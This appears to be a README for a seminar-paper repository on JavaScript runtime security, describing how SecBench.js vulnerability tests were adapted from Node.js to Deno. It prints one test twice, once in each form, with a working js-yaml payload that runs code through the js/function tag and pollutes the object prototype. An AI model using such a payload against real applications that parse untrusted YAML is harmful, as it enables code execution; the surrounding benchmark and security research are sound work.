# State of Security in JavaScript Runtimes
The repository contains all the resources used while writing the seminar paper on the topic "Security of Emerging JavaScript Runtimes".

<br>

Note that SecBench.js logs contain some files ANSI-encoded, while some are plaintext. It is recommended to read the files from the terminal or from a tool that supports both encodings. 

<br>

While SecBench.js works as is for Node.js, it requires some adjustments to function properly alongside Deno.
The main issue is the different import mechanisms and the different syntax. For example, to use "require" and "expect", the methods have to be explicitly imported.

<br>

For instance, for the test case js-yaml in command injection we had this snippet:

```js
test("Arbitrary code execution in js-yaml", () => {
  expect.assertions(2);
  const payload =
    "{ toString: !<tag:yaml.org,2002:js/function> 'function (){return (this.constructor.prototype.polluted=`yes`)}' } : 1";
  const jsyaml = require("js-yaml");
  expect({}.polluted).toBe(undefined);
  try {
    jsyaml.load(payload);
  } catch (error) {}
  expect({}.polluted).toBe("yes");
});
```

That for Deno had to be modified in the following one:
```ts
import { expect } from "jsr:@std/expect";
import { createRequire } from "node:module";

Deno.test("Arbitrary code execution in js-yaml", () => {
  const require = createRequire(import.meta.url);
  expect.assertions(2);
  const payload =
    "{ toString: !<tag:yaml.org,2002:js/function> 'function (){return (this.constructor.prototype.polluted=`yes`)}' } : 1";
  const jsyaml = require("js-yaml");
  expect({}.polluted).toBe(undefined);
  try {
    jsyaml.load(payload);
  } catch (error) {}
  expect({}.polluted).toBe("yes");
});
```

As it can be seen, "expect" module was imported before usage and "require" is simulated with the "createRequire" module.
